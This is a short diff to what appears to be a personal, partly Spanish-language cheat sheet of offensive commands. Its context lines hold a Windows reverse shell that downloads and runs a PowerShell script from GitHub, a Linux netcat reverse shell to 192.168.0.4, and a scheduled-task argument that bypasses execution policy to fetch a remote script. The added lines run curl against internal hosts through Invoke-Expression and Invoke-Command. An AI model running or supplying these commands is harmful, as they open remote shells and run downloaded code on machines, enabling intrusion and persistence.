@@ -16,6 +16,9 @@ reverse-shell for windows:
 	IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.0.4 443
 reverse-shell for linux:
 		nc -e /bin/bash 192.168.0.4 443
+remote code:
+	Invoke-Expression "python -c 'import os; os.system(""curl 192.168.0.4"")'"
+	Invoke-Command {python -c "import os;os.system('curl 192.168.0.3:8080')"}
 Argumento en tarea programada para windows:
 	- Argument: -executionpolicy bypass IEX(IWR https://raw.githubusercontent.com/AndresFelipeGualdron/scripts/master/connection.ps1);
 Mostrar alerta en windows:
